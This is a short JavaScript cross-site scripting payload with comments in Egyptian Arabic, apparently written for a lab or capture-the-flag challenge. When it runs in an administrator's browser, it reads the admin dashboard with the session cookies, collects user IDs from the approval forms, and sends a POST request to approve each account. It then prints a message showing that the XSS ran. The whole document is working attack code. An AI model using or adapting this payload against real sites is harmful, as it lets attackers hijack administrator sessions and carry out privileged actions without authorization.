(function() {
         // جيب الـ HTML من /admin/dashboard مع credentials: 'include' عشان الـ session تتبعت
         fetch('/admin/dashboard', {
             method: 'GET',
             credentials: 'include' // ده اللي هيخلي الـ cookies والـ session تتبعت
         })
         .then(response => response.text())
         .then(data => {
             var parser = new DOMParser();
             var doc = parser.parseFromString(data, 'text/html');
             var userIds = [];
             var forms = doc.querySelectorAll('form[action^="/admin/approve/"]');
             forms.forEach(form => {
                 var action = form.getAttribute('action');
                 var userId = action.split('/admin/approve/')[1];
                 if (userId) userIds.push(userId);
             });

             // ابعت POST request لكل userId مع credentials: 'include'
             userIds.forEach(userId => {
                 fetch('/admin/approve/' + userId, {
                     method: 'POST',
                     credentials: 'include' // هنا كمان عشان الـ POST يتبعت بالـ session
                 })
                 .then(() => console.log('Approved userId: ' + userId))
                 .catch(error => console.error('Error:', error));
             });

             // دليل على إن الـ XSS اشتغل
             document.body.innerHTML += '<h1>XSS Executed with Credentials Include!</h1>';
             console.log('XSS executed! Sent POST to approve userIds:', userIds);
         })
         .catch(error => console.error('Error:', error));
     })();
